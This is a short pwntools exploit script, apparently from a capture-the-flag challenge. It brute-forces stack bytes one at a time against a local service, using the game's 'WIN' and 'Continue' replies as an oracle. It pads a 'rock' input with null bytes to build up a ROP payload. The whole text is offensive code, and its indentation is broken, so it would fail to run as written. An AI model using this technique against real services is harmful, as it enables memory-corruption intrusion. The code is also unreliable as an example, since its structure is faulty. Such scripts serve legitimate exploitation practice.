from pwn import *

context.log_level = 'ERROR'
def check_char(rop, c) :
	while True :
		p = remote("0.0.0.0", 12345)
		# context.log_level = "debug" 
		rop_ = rop + c
		p.sendafter("Your choice: ", rop_)
		if "WIN" not in p.recvline() :
			p.close()
			continue
		try :
			if "Continue" in p.recv() :
				return True
		except Exception as e:
			print(e)
			p.close()
			return False

	return False

rop = "rock" + "\x00" * 0x24 + '\x00'
try :
	for _ in range(15) :
		for i in range(256) :
			print(i)
			if check_char(rop, chr(i)) :
				print("found : ",i)
					rop += chr(i)
					print(rop)
					break
                if i == 255 :
					print("Wrong")
					print(rop)
					exit(0)
except Exception as e:
	print(rop)
